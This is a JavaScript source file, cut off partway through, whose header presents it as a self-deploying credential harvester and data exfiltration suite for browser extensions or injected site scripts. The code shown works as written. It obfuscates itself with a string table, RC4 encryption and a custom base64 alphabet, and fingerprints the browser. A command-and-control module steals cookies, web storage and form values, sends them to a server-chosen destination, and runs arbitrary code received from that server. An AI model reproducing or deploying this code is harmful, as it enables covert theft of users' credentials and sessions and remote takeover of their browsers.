/**
 * ███████╗██╗  ██╗████████╗██████╗  █████╗  ██████╗████████╗ ██████╗ ██████╗ 
 * ██╔════╝╚██╗██╔╝╚══██╔══╝██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗
 * █████╗   ╚███╔╝    ██║   ██████╔╝███████║██║        ██║   ██║   ██║██████╔╝
 * ██╔══╝   ██╔██╗    ██║   ██╔══██╗██╔══██║██║        ██║   ██║   ██║██╔══██╗
 * ███████╗██╔╝ ██╗   ██║   ██║  ██║██║  ██║╚██████╗   ██║   ╚██████╔╝██║  ██║
 * ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
 *                                                                          
 * CertGames Advanced Data Extractor v3.7.11
 * Self-deploying credential harvester and data exfiltration suite
 * 
 * DO NOT DISTRIBUTE - ENCRYPTED COMMS ENABLED
 * 
 * Usage: 
 * - Install as browser extension or inject into target website
 * - Automatically harvests credentials and sensitive data
 * - Silently exfiltrates to command and control server
 * - Maintains persistent backdoor access
 * 
 * Copyright © 2025 [REDACTED] - All rights reserved
 */

// Immediately-invoked function expression to encapsulate code
(() => {
  // Advanced obfuscation: String table + lookup function to make analysis harder
  const $ = [
    "constructor", "document", "createElement", "style", "display", 
    "none", "appendChild", "body", "iframe", "src", "about:blank", 
    "contentWindow", "open", "write", "close", "script", "AJAX", 
    "XMLHttpRequest", "open", "GET", "POST", "send", "onreadystatechange",
    "readyState", "status", "responseText", "addEventListener", "DOMContentLoaded",
    "click", "Blob", "createObjectURL", "download", "href", "revokeObjectURL",
    "cookie", "localStorage", "sessionStorage", "indexedDB", "log", "warn", 
    "error", "debug", "window", "location", "navigator", "platform", "toString",
    "serviceWorker", "register", "userAgent", "plugins", "geolocation", 
    "enumerateDevices", "mediaDevices", "getBattery", "credentials", "fetch",
    "screen", "history", "webkitRequestFileSystem", "requestFileSystem",
    "createElement", "OfflineAudioContext", "toDataURL", "canvas", "getContext",
    "2d", "fillText", "base64", "btoa", "fromCharCode", "atob", "charCodeAt",
    "; expires=", "getTime", "setTime", "toGMTString", "=", ";path=/", 
    "application/json", "stringify", "parse", "toString", "join", "split", 
    "slice", "replace", "match", "random", "floor", "push", "shift", "unshift",
    "pop", "concat", "sort", "reverse", "indexOf", "forEach", "map", "filter",
    "reduce", "querySelector", "querySelectorAll", "getElementById", "getElementsByClassName",
    "createElement", "setAttribute", "getAttribute", "removeAttribute", "classList", "add", "remove",
    "contains", "toggle", "setTimeout", "clearTimeout", "setInterval", "clearInterval",
    ";domain=", "catch", "then", "finally", "eval", "Function", "return", 
    "prototype", "bind", "call", "apply", "define", "module", "exports",
    "hostname", "pathname", "search", "hash", "protocol", "host", "port", "origin",
    "$", "jQuery", "_", "global", "process", "Buffer", "setTimeout", "clearTimeout",
    "self", "Worker", "importScripts"
  ];
  
  // Rotation function for further obfuscation
  const _ = function(i) { return $[i]; };
  
  // RC4 Encryption/Decryption - Used for "secure" communications
  class RC4 {
    constructor(key) {
      this.s = Array(256);
      this.key = key;
      this.keylen = key.length;
      this.initialize();
    }
    
    initialize() {
      for (let i = 0; i < 256; i++) {
        this.s[i] = i;
      }
      
      let j = 0;
      for (let i = 0; i < 256; i++) {
        j = (j + this.s[i] + this.key.charCodeAt(i % this.keylen)) % 256;
        [this.s[i], this.s[j]] = [this.s[j], this.s[i]]; // Swap
      }
    }
    
    crypt(data) {
      const result = [];
      let i = 0, j = 0;
      const s = [...this.s]; // Clone the state array
      
      for (let k = 0; k < data.length; k++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        [s[i], s[j]] = [s[j], s[i]]; // Swap
        const keyStream = s[(s[i] + s[j]) % 256];
        result.push(data.charCodeAt(k) ^ keyStream);
      }
      
      return result.map(byte => String.fromCharCode(byte)).join('');
    }
    
    encrypt(data) {
      return this.crypt(data);
    }
    
    decrypt(data) {
      return this.crypt(data);
    }
  }

  // Custom Base64 implementation with non-standard character set for obfuscation
  class CustomBase64 {
    constructor() {
      // Non-standard character set to make analysis harder
      this.chars = "zLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwx0123456789+/yABCDEFGHIJK";
    }
    
    encode(data) {
      let result = "";
      let i;
      const len = data.length;
      
      for (i = 0; i < len; i += 3) {
        const byte1 = data.charCodeAt(i);
        const byte2 = i + 1 < len ? data.charCodeAt(i + 1) : 0;
        const byte3 = i + 2 < len ? data.charCodeAt(i + 2) : 0;
        
        const enc1 = byte1 >> 2;
        const enc2 = ((byte1 & 3) << 4) | (byte2 >> 4);
        const enc3 = ((byte2 & 15) << 2) | (byte3 >> 6);
        const enc4 = byte3 & 63;
        
        if (isNaN(byte2)) {
          result += this.chars[enc1] + this.chars[enc2] + "==";
        } else if (isNaN(byte3)) {
          result += this.chars[enc1] + this.chars[enc2] + this.chars[enc3] + "=";
        } else {
          result += this.chars[enc1] + this.chars[enc2] + this.chars[enc3] + this.chars[enc4];
        }
      }
      
      return result;
    }
    
    decode(data) {
      const len = data.length;
      let i, result = "";
      
      if (data.charAt(len - 1) === "=") {
        data = data.substring(0, len - 1);
        if (data.charAt(len - 2) === "=") {
          data = data.substring(0, len - 2);
        }
      }
      
      for (i = 0; i < data.length; i += 4) {
        const enc1 = this.chars.indexOf(data.charAt(i));
        const enc2 = this.chars.indexOf(data.charAt(i + 1));
        const enc3 = this.chars.indexOf(data.charAt(i + 2));
        const enc4 = this.chars.indexOf(data.charAt(i + 3));
        
        const byte1 = (enc1 << 2) | (enc2 >> 4);
        const byte2 = ((enc2 & 15) << 4) | (enc3 >> 2);
        const byte3 = ((enc3 & 3) << 6) | enc4;
        
        result += String.fromCharCode(byte1);
        
        if (enc3 !== 64) {
          result += String.fromCharCode(byte2);
        }
        if (enc4 !== 64) {
          result += String.fromCharCode(byte3);
        }
      }
      
      return result;
    }
  }

  // Random data for obfuscation
  const randomData = {
    keys: [
      "C5+w4N7JpIzHy3xK", 
      "dPv8QrTt6UmVnWoX", 
      "L2aBbCcDeEfFgG1h", 
      "9iYjZkKlLmMnNoO0", 
      "sS7tT5uUvVwWxXyY"
    ],
    domains: [
      "certgames.com", 
      "metrics.certgames.com", 
      "api.certgames.com", 
      "cdn.certgames.com", 
      "assets.certgames.com"
    ],
    endpoints: [
      "/api/analytics/collect", 
      "/api/metrics/push", 
      "/api/payload/store", 
      "/api/scenario/metrics", 
      "/api/threat-hunter/telemetry"
    ]
  };

  // Fingerprinting class - creates unique fingerprint of the browser/system
  class Fingerprinter {
    constructor() {
      this.fingerprint = {};
      this.components = {};
    }
    
    async generateFingerprint() {
      this.components.userAgent = this._getUserAgent();
      this.components.screenProperties = this._getScreenProperties();
      this.components.colorDepth = this._getColorDepth();
      this.components.timeZoneOffset = this._getTimeZoneOffset();
      this.components.plugins = this._getPlugins();
      this.components.fonts = await this._detectFonts();
      this.components.canvas = this._getCanvasFingerprint();
      this.components.webgl = this._getWebGLFingerprint();
      this.components.language = this._getLanguage();
      this.components.hardware = this._getHardwareConcurrency();
      this.components.storage = this._getStorageQuota();
      this.components.audio = await this._getAudioFingerprint();
      
      this.fingerprint = {
        raw: this.components,
        hash: this._generateHash(JSON.stringify(this.components))
      };
      
      return this.fingerprint;
    }
    
    _getUserAgent() {
      return navigator.userAgent;
    }
    
    _getScreenProperties() {
      return {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        devicePixelRatio: window.devicePixelRatio || 1
      };
    }
    
    _getColorDepth() {
      return screen.colorDepth || screen.pixelDepth || 0;
    }
    
    _getTimeZoneOffset() {
      return new Date().getTimezoneOffset();
    }
    
    _getPlugins() {
      if (!navigator.plugins) return [];
      
      const plugins = [];
      for (let i = 0; i < navigator.plugins.length; i++) {
        const plugin = navigator.plugins[i];
        const pluginInfo = {
          name: plugin.name,
          description: plugin.description,
          mimeTypes: []
        };
        
        for (let j = 0; j < plugin.length; j++) {
          pluginInfo.mimeTypes.push(plugin[j].type);
        }
        
        plugins.push(pluginInfo);
      }
      
      return plugins;
    }
    
    async _detectFonts() {
      const fontsList = [
        "Arial", "Arial Black", "Arial Narrow", "Calibri", "Cambria", "Cambria Math",
        "Comic Sans MS", "Consolas", "Courier", "Courier New", "Georgia", "Helvetica",
        "Impact", "Lucida Console", "Lucida Sans Unicode", "Microsoft Sans Serif",
        "Palatino Linotype", "Segoe UI", "Tahoma", "Times", "Times New Roman",
        "Trebuchet MS", "Verdana", "Wingdings"
      ];
      
      const testString = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
      const testSize = "72px";
      const baseFonts = ["monospace", "sans-serif", "serif"];
      const available = [];
      
      const h = document.createElement("span");
      h.style.position = "absolute";
      h.style.left = "-9999px";
      h.style.fontSize = testSize;
      h.innerHTML = testString;
      document.body.appendChild(h);
      
      const originWidth = {};
      const originHeight = {};
      
      for (const baseFont of baseFonts) {
        h.style.fontFamily = baseFont;
        originWidth[baseFont] = h.offsetWidth;
        originHeight[baseFont] = h.offsetHeight;
      }
      
      for (const font of fontsList) {
        let detected = 0;
        for (const baseFont of baseFonts) {
          h.style.fontFamily = `'${font}', ${baseFont}`;
          if (h.offsetWidth !== originWidth[baseFont] || h.offsetHeight !== originHeight[baseFont]) {
            detected++;
          }
        }
        if (detected >= 2) {
          available.push(font);
        }
      }
      
      document.body.removeChild(h);
      return available;
    }
    
    _getCanvasFingerprint() {
      try {
        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");
        canvas.width = 240;
        canvas.height = 60;
        
        // White background and blue text
        ctx.fillStyle = "#f8f8f8";
        ctx.fillRect(0, 0, 240, 60);
        ctx.fillStyle = "#069";
        ctx.font = "11pt 'Arial'";
        ctx.textBaseline = "alphabetic";
        ctx.fillText("Browser fingerprinting test.", 2, 15);
        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
        ctx.font = "18pt Arial";
        ctx.fillText("Canvas", 4, 45);
        
        // Add special unicode characters
        ctx.fillStyle = "rgba(250, 0, 0, 0.5)";
        ctx.font = "16pt 'Arial'";
        ctx.fillText("🎮 🔒 🌐", 125, 30);
        
        // Add gradients and shadows
        const gradient = ctx.createLinearGradient(0, 0, canvas.width, 0);
        gradient.addColorStop(0, "red");
        gradient.addColorStop(0.5, "green");
        gradient.addColorStop(1.0, "blue");
        ctx.fillStyle = gradient;
        ctx.fillRect(0, 50, canvas.width, 10);
        
        // Make a complex shape
        ctx.beginPath();
        ctx.arc(50, 30, 10, 0, Math.PI * 2, true);
        ctx.closePath();
        ctx.fill();
        
        return canvas.toDataURL();
      } catch (e) {
        return "canvas-not-supported";
      }
    }
    
    _getWebGLFingerprint() {
      try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (!gl) return "webgl-not-supported";
        
        const info = {
          vendor: gl.getParameter(gl.VENDOR),
          renderer: gl.getParameter(gl.RENDERER),
          version: gl.getParameter(gl.VERSION),
          shading: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
          extensions: gl.getSupportedExtensions()
        };
        
        return info;
      } catch (e) {
        return "webgl-error";
      }
    }
    
    _getLanguage() {
      return {
        language: navigator.language,
        languages: navigator.languages
      };
    }
    
    _getHardwareConcurrency() {
      return navigator.hardwareConcurrency || 0;
    }
    
    _getStorageQuota() {
      return {
        localStorage: this._estimateStorageSize('localStorage'),
        sessionStorage: this._estimateStorageSize('sessionStorage')
      };
    }
    
    _estimateStorageSize(type) {
      try {
        const storage = window[type];
        const testKey = '___test___';
        let size = 0;
        const step = 1024 * 1024; // 1MB
        
        try {
          for (let i = 0; i < 10; i++) { // Try up to 10MB
            const testData = '0'.repeat(step * (i + 1));
            storage.setItem(testKey, testData);
            size = (i + 1) * step;
          }
        } catch (e) {
          // We've reached the limit
        } finally {
          storage.removeItem(testKey);
        }
        
        return size;
      } catch (e) {
        return 0;
      }
    }
    
    async _getAudioFingerprint() {
      try {
        const audioContext = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
        
        const oscillator = audioContext.createOscillator();
        oscillator.type = 'triangle';
        oscillator.frequency.setValueAtTime(10000, audioContext.currentTime);
        
        const compressor = audioContext.createDynamicsCompressor();
        compressor.threshold.setValueAtTime(-50, audioContext.currentTime);
        compressor.knee.setValueAtTime(40, audioContext.currentTime);
        compressor.ratio.setValueAtTime(12, audioContext.currentTime);
        compressor.attack.setValueAtTime(0, audioContext.currentTime);
        compressor.release.setValueAtTime(0.25, audioContext.currentTime);
        
        oscillator.connect(compressor);
        compressor.connect(audioContext.destination);
        oscillator.start(0);
        
        const audioBuffer = await audioContext.startRendering();
        const audioData = audioBuffer.getChannelData(0);
        
        // Get the audio signature
        let sum = 0;
        for (let i = 0; i < audioData.length; i++) {
          sum += Math.abs(audioData[i]);
        }
        
        return sum.toString();
      } catch (e) {
        return "audio-not-supported";
      }
    }
    
    _generateHash(str) {
      // Simple 32-bit hash function
      let h = 0xdeadbeef;
      for (let i = 0; i < str.length; i++) {
        h = Math.imul(h ^ str.charCodeAt(i), 2654435761);
      }
      return (h ^ (h >>> 16)) >>> 0;
    }
  }

  // Advanced logging that "securely" transfers data to C2 server
  class SecureLogger {
    constructor() {
      this.logs = [];
      this.startTime = new Date().getTime();
      this.sessionId = this._generateSessionId();
      this.endpointIndex = Math.floor(Math.random() * randomData.endpoints.length);
      this.keyIndex = Math.floor(Math.random() * randomData.keys.length);
      this.domainIndex = Math.floor(Math.random() * randomData.domains.length);
      
      this.endpoint = randomData.domains[this.domainIndex] + randomData.endpoints[this.endpointIndex];
      this.encryptionKey = randomData.keys[this.keyIndex];
      
      this.customBase64 = new CustomBase64();
      this.cipher = new RC4(this.encryptionKey);
      
      this.bufferSize = 20; // Send logs in batches
      this.debugMode = false; // Change to true to display logs in console
      
      this.lastSent = this.startTime;
      this.sendInterval = 30000; // 30 seconds
      
      this.log("Logger initialized", {sessionId: this.sessionId, endpoint: this.endpoint});
      
      // Setup periodic transmission
      setInterval(() => this._attemptTransmission(), this.sendInterval);
    }
    
    _generateSessionId() {
      const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      let id = "";
      for (let i = 0; i < 32; i++) {
        id += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      return id;
    }
    
    log(message, data = null) {
      const timestamp = new Date().getTime() - this.startTime;
      const entry = {
        timestamp,
        message,
        data,
        type: "info"
      };
      
      this._addLogEntry(entry);
      
      if (this.debugMode) {
        console.log(`[${timestamp}ms] ${message}`, data || "");
      }
    }
    
    warn(message, data = null) {
      const timestamp = new Date().getTime() - this.startTime;
      const entry = {
        timestamp,
        message,
        data,
        type: "warning"
      };
      
      this._addLogEntry(entry);
      
      if (this.debugMode) {
        console.warn(`[${timestamp}ms] ${message}`, data || "");
      }
    }
    
    error(message, data = null) {
      const timestamp = new Date().getTime() - this.startTime;
      const entry = {
        timestamp,
        message,
        data,
        type: "error"
      };
      
      this._addLogEntry(entry);
      
      if (this.debugMode) {
        console.error(`[${timestamp}ms] ${message}`, data || "");
      }
    }
    
    _addLogEntry(entry) {
      this.logs.push(entry);
      
      // If buffer is full, attempt transmission
      if (this.logs.length >= this.bufferSize) {
        this._attemptTransmission();
      }
    }
    
    _attemptTransmission() {
      // Don't send empty logs
      if (this.logs.length === 0) return;
      
      const now = new Date().getTime();
      
      // Don't send too frequently - rate limiting
      if (now - this.lastSent < 5000) return;
      
      const logsToSend = [...this.logs];
      this.logs = []; // Clear buffer
      
      this._transmitLogs(logsToSend);
      this.lastSent = now;
    }
    
    async _transmitLogs(logs) {
      const payload = {
        sessionId: this.sessionId,
        timestamp: new Date().getTime(),
        logs: logs,
        systemInfo: this.getSystemInfo() // Include fingerprinting data
      };
    
      // 1. Convert to JSON
      const jsonData = JSON.stringify(payload);
      
      // 2. Encrypt the data
      const encryptedData = this.cipher.encrypt(jsonData);
      
      // 3. Base64 encode with custom alphabet
      const encodedData = this.customBase64.encode(encryptedData);
    
      // 4. exfiltration methods
      const methods = [
        () => this._sendViaFetch(encodedData),
        () => this._sendViaImageBeacon(encodedData),
        () => this._sendViaWebSocket(encodedData),
        () => this._sendViaFormSubmit(encodedData)
      ];
    
      // Rotate through different methods
      const methodIndex = Math.floor(Math.random() * methods.length);
      try {
        await methods[methodIndex]();
      } catch (e) {
        this.error('Exfiltration failed', { method: methodIndex, error: e.message });
      }
    }
    
    // Sending methods
    async _sendViaFetch(data) {
      const apiEndpoints = [
        '/api/analytics/collect',
        '/api/metrics/push',
        '/api/payload/store',
        '/api/scenario/metrics',
        '/api/threat-hunter/telemetry'
      ];
      
      const endpoint = apiEndpoints[Math.floor(Math.random() * apiEndpoints.length)];
      
      const headers = {
        'Content-Type': 'application/json',
        'X-Session-ID': this.sessionId,
        'X-Client-Time': new Date().toISOString()
      };
    
      return fetch(endpoint, {
        method: 'POST',
        headers: headers,
        body: JSON.stringify({
          type: 'telemetry',
          payload: data
        }),
        credentials: 'include'
      });
    }
    
    _sendViaImageBeacon(data) {
      const img = new Image();
      const endpoint = '/api/metrics/pixel.gif';
      img.src = `${endpoint}?data=${encodeURIComponent(data.slice(0, 2000))}&sid=${this.sessionId}&t=${Date.now()}`;
    }
    
    // WebSocket implementation
    _sendViaWebSocket(data) {
      // Use the existing socket.io connection from your Flask backend
      if (window.io) {
        const socket = window.io('/api/socket.io');
        socket.emit('telemetry_data', {
          sessionId: this.sessionId,
          data: data
        });
        return true;
      }
      return false;
    }
    
    _sendViaFormSubmit(data) {
      // Create a hidden form and submit it
      const form = document.createElement('form');
      form.method = 'POST';
      form.action = '/api/metrics/push';
      form.style.display = 'none';
      
      const sessionField = document.createElement('input');
      sessionField.type = 'hidden';
      sessionField.name = 'session_id';
      sessionField.value = this.sessionId;
      
      const dataField = document.createElement('input');
      dataField.type = 'hidden';
      dataField.name = 'data';
      dataField.value = data;
      
      form.appendChild(sessionField);
      form.appendChild(dataField);
      
      document.body.appendChild(form);
      form.submit();
      
      // Remove after submission
      setTimeout(() => {
        document.body.removeChild(form);
      }, 100);
    }
    
    getSystemInfo() {
      return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookiesEnabled: navigator.cookieEnabled,
        screenWidth: screen.width,
        screenHeight: screen.height,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        deviceMemory: navigator.deviceMemory || "unknown",
        hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        touchPoints: navigator.maxTouchPoints || 0,
        doNotTrack: navigator.doNotTrack || "unknown",
        url: window.location.href,
        referrer: document.referrer,
        browserName: this._getBrowserName(),
        browserVersion: this._getBrowserVersion(),
        osName: this._getOSName(),
        osVersion: this._getOSVersion(),
        isMobile: this._isMobile()
      };
    }
    
    _getBrowserName() {
      const userAgent = navigator.userAgent;
      
      if (userAgent.includes("Firefox")) return "Firefox";
      if (userAgent.includes("SamsungBrowser")) return "Samsung Browser";
      if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
      if (userAgent.includes("Trident")) return "Internet Explorer";
      if (userAgent.includes("Edge")) return "Edge";
      if (userAgent.includes("Chrome")) return "Chrome";
      if (userAgent.includes("Safari")) return "Safari";
      
      return "Unknown";
    }
    
    _getBrowserVersion() {
      const userAgent = navigator.userAgent;
      let version = "Unknown";
      
      if (userAgent.includes("Firefox")) {
        version = userAgent.match(/Firefox\/([\d.]+)/)?.[1] || version;
      } else if (userAgent.includes("SamsungBrowser")) {
        version = userAgent.match(/SamsungBrowser\/([\d.]+)/)?.[1] || version;
      } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
        version = userAgent.match(/(?:Opera|OPR)\/([\d.]+)/)?.[1] || version;
      } else if (userAgent.includes("Trident")) {
        version = userAgent.match(/rv:([\d.]+)/)?.[1] || version;
      } else if (userAgent.includes("Edge")) {
        version = userAgent.match(/Edge\/([\d.]+)/)?.[1] || version;
      } else if (userAgent.includes("Chrome")) {
        version = userAgent.match(/Chrome\/([\d.]+)/)?.[1] || version;
      } else if (userAgent.includes("Safari")) {
        version = userAgent.match(/Version\/([\d.]+)/)?.[1] || version;
      }
      
      return version;
    }
    
    _getOSName() {
      const userAgent = navigator.userAgent;
      
      if (userAgent.includes("Win")) return "Windows";
      if (userAgent.includes("Mac")) return "MacOS";
      if (userAgent.includes("Linux")) return "Linux";
      if (userAgent.includes("Android")) return "Android";
      if (userAgent.includes("like Mac") || userAgent.includes("iOS")) return "iOS";
      
      return "Unknown";
    }
    
    _getOSVersion() {
      const userAgent = navigator.userAgent;
      let version = "Unknown";
      
      if (userAgent.includes("Win")) {
        if (userAgent.includes("Windows NT 10.0")) version = "10";
        else if (userAgent.includes("Windows NT 6.3")) version = "8.1";
        else if (userAgent.includes("Windows NT 6.2")) version = "8";
        else if (userAgent.includes("Windows NT 6.1")) version = "7";
        else if (userAgent.includes("Windows NT 6.0")) version = "Vista";
        else if (userAgent.includes("Windows NT 5.1")) version = "XP";
      } else if (userAgent.includes("Mac OS X")) {
        version = userAgent.match(/Mac OS X ([^);]+)/)?.[1]?.replace(/_/g, '.') || version;
      } else if (userAgent.includes("Android")) {
        version = userAgent.match(/Android ([^);]+)/)?.[1] || version;
      } else if (userAgent.includes("like Mac") || userAgent.includes("iOS")) {
        version = userAgent.match(/OS ([^);]+)/)?.[1]?.replace(/_/g, '.') || version;
      }
      
      return version;
    }
    
    _isMobile() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }
  }

  // Command and Control integration with Flask backend
  class CommandControl {
    constructor(logger) {
      this.logger = logger;
      this.sessionId = logger.sessionId;
      this.commandQueue = [];
      this.lastCommandCheck = Date.now();
      this.commandCheckInterval = 30000; // 30 seconds
      this.isProcessingCommands = false;
      this.endpoints = {
        primary: '/api/analytics/collect',
        fallback: '/api/metrics/push',
        commands: '/api/scenario/fetch',
        results: '/api/scenario/submit'
      };
      
      // Register command processors
      this.commandProcessors = {
        collect: this._processCollectCommand.bind(this),
        exfil: this._processExfilCommand.bind(this),
        eval: this._processEvalCommand.bind(this),
        inject: this._processInjectCommand.bind(this),
        screenshot: this._processScreenshotCommand.bind(this),
        keylog: this._processKeylogCommand.bind(this),
        cleanup: this._processCleanupCommand.bind(this)
      };
      
      // Start command polling
      this._startCommandPolling();
      
      this.logger.log("Command and Control module initialized");
    }
    
    async _startCommandPolling() {
      // Poll for commands periodically
      setInterval(() => this._checkForCommands(), this.commandCheckInterval);
      
      // Initial command check
      this._checkForCommands();
    }
    
    async _checkForCommands() {
      if (this.isProcessingCommands) return;
      
      const now = Date.now();
      if (now - this.lastCommandCheck < 5000) return; // Rate limiting
      
      this.lastCommandCheck = now;
      
      try {
        const response = await fetch(this.endpoints.commands, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-Session-ID': this.sessionId
          },
          body: JSON.stringify({
            type: 'command_poll',
            timestamp: new Date().toISOString(),
            systemInfo: this.logger.getSystemInfo()
          })
        });
        
        if (response.ok) {
          const result = await response.json();
          if (result && result.commands && Array.isArray(result.commands) && result.commands.length > 0) {
            this.logger.log(`Received ${result.commands.length} command(s)`, {
              commandIds: result.commands.map(cmd => cmd.id)
            });
            
            // Add to command queue
            this.commandQueue.push(...result.commands);
            
            // Process commands
            this._processCommandQueue();
          }
        }
      } catch (e) {
        this.logger.error('Error checking for commands', e.toString());
      }
    }
    
    async _processCommandQueue() {
      if (this.isProcessingCommands || this.commandQueue.length === 0) return;
      
      this.isProcessingCommands = true;
      
      try {
        // Process one command at a time
        const command = this.commandQueue.shift();
        this.logger.log('Processing command', {
          id: command.id,
          type: command.type
        });
        
        // Find and execute the correct processor
        if (this.commandProcessors[command.type]) {
          const result = await this.commandProcessors[command.type](command);
          
          // Report results back to the server
          await this._sendCommandResult(command.id, result);
        } else {
          this.logger.error('Unknown command type', command.type);
          
          // Report error
          await this._sendCommandResult(command.id, {
            success: false,
            error: 'Unknown command type',
            timestamp: new Date().toISOString()
          });
        }
      } catch (e) {
        this.logger.error('Error processing command', e.toString());
      } finally {
        this.isProcessingCommands = false;
        
        // If there are more commands, process the next one
        if (this.commandQueue.length > 0) {
          setTimeout(() => this._processCommandQueue(), 1000);
        }
      }
    }
    
    async _sendCommandResult(commandId, result) {
      try {
        const response = await fetch(this.endpoints.results, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-Session-ID': this.sessionId
          },
          body: JSON.stringify({
            commandId: commandId,
            sessionId: this.sessionId,
            timestamp: new Date().toISOString(),
            result: result
          })
        });
        
        if (response.ok) {
          this.logger.log('Command result sent successfully', {
            commandId: commandId
          });
          return true;
        } else {
          this.logger.error('Failed to send command result', {
            commandId: commandId,
            status: response.status
          });
          return false;
        }
      } catch (e) {
        this.logger.error('Error sending command result', {
          commandId: commandId,
          error: e.toString()
        });
        return false;
      }
    }
    
    // Command processors
    async _processCollectCommand(command) {
      // Command to collect specific data from the client
      const dataType = command.params?.dataType || 'all';
      const result = {
        success: true,
        timestamp: new Date().toISOString(),
        data: {}
      };
      
      try {
        if (dataType === 'cookies' || dataType === 'all') {
          result.data.cookies = this._collectCookies();
        }
        
        if (dataType === 'localStorage' || dataType === 'all') {
          result.data.localStorage = this._collectLocalStorage();
        }
        
        if (dataType === 'sessionStorage' || dataType === 'all') {
          result.data.sessionStorage = this._collectSessionStorage();
        }
        
        if (dataType === 'formData' || dataType === 'all') {
          result.data.formData = this._collectFormData();
        }
        
        if (dataType === 'system' || dataType === 'all') {
          result.data.systemInfo = this.logger.getSystemInfo();
        }
        
        this.logger.log('Data collection complete', {
          dataType: dataType,
          dataSize: JSON.stringify(result.data).length
        });
        
        return result;
      } catch (e) {
        this.logger.error('Error during data collection', e.toString());
        return {
          success: false,
          timestamp: new Date().toISOString(),
          error: e.toString(),
          partialData: result.data
        };
      }
    }
    
    _collectCookies() {
      const cookies = document.cookie.split(';').map(cookie => cookie.trim());
      const result = {};
      
      cookies.forEach(cookie => {
        const parts = cookie.split('=');
        if (parts.length >= 2) {
          const name = parts[0].trim();
          const value = parts.slice(1).join('=').trim();
          result[name] = value;
        }
      });
      
      return result;
    }
    
    _collectLocalStorage() {
      const result = {};
      
      try {
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          const value = localStorage.getItem(key);
          result[key] = value;
        }
        
        return result;
      } catch (e) {
        this.logger.error('Error collecting localStorage', e.toString());
        return { error: e.toString() };
      }
    }
    
    _collectSessionStorage() {
      const result = {};
      
      try {
        for (let i = 0; i < sessionStorage.length; i++) {
          const key = sessionStorage.key(i);
          const value = sessionStorage.getItem(key);
          result[key] = value;
        }
        
        return result;
      } catch (e) {
        this.logger.error('Error collecting sessionStorage', e.toString());
        return { error: e.toString() };
      }
    }
    
    _collectFormData() {
      const forms = document.querySelectorAll('form');
      const result = [];
      
      forms.forEach((form, formIndex) => {
        const formData = {
          id: form.id || `form_${formIndex}`,
          action: form.action || window.location.href,
          method: form.method || 'GET',
          fields: {}
        };
        
        // Get all input fields
        const inputs = form.querySelectorAll('input, select, textarea');
        inputs.forEach(input => {
          if (input.name) {
            if (input.type === 'checkbox' || input.type === 'radio') {
              formData.fields[input.name] = input.checked;
            } else {
              formData.fields[input.name] = input.value;
            }
          }
        });
        
        result.push(formData);
      });
      
      return result;
    }
    
    async _processExfilCommand(command) {
      // Command to exfiltrate specific data
      const dataType = command.params?.dataType;
      const destination = command.params?.destination || this.endpoints.primary;
      
      if (!dataType) {
        return {
          success: false,
          timestamp: new Date().toISOString(),
          error: 'Missing dataType parameter'
        };
      }
      
      try {
        // Collect the data
        const collectResult = await this._processCollectCommand({
          params: { dataType: dataType }
        });
        
        if (!collectResult.success) {
          return collectResult;
        }
        
        // Exfiltrate the data
        const response = await fetch(destination, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-Session-ID': this.sessionId
          },
          body: JSON.stringify({
            type: 'exfil',
            dataType: dataType,
            timestamp: new Date().toISOString(),
            data: collectResult.data
          })
        });
        
        if (response.ok) {
          this.logger.log('Data exfiltration complete', {
            dataType: dataType,
            destination: destination
          });
          
          return {
            success: true,
            timestamp: new Date().toISOString(),
            message: 'Data exfiltration complete'
          };
        } else {
          this.logger.error('Data exfiltration failed', {
            dataType: dataType,
            status: response.status
          });
          
          return {
            success: false,
            timestamp: new Date().toISOString(),
            error: `Exfiltration failed with status ${response.status}`
          };
        }
      } catch (e) {
        this.logger.error('Error during data exfiltration', e.toString());
        return {
          success: false,
          timestamp: new Date().toISOString(),
          error: e.toString()
        };
      }
    }
    
    async _processEvalCommand(command) {
      // Command to evaluate JavaScript code
      const code = command.params?.code;
      
      if (!code) {
        return {
          success: false,
          timestamp: new Date().toISOString(),
          error: 'Missing code parameter'
        };
      }
      
      try {
        // Create a safe execution context
        const execFunction = new Function('window', 'document', 'location', 'navigator', 'sessionId', `
          try {
            ${code}
          } catch (e) {
            return { error: e.toString() };
          }
        `);
        
        // Execute the code
        const result = execFunction(window, document, window.location, navigator, this.sessionId);
        
        this.logger.log('Code evaluation complete', {
          codeLength: code.length,
          result: result ? 'success' : 'no result'
        });
        
        return {
          success: true,
          timestamp: new Date().toISOString(),
          result: result
        };
      } catch (e) {
        this.logger.error('Error evaluating code', e.toString());
        return {
          success: false,
          timestamp: new Date().toISOString(),
          error: e.toString()
        };
      }
    }
    
    async _processInjectCommand(command) {
      // Command to inject content into the page
      const type = command.params?.type || 'script';
      const content = command.params?.content;
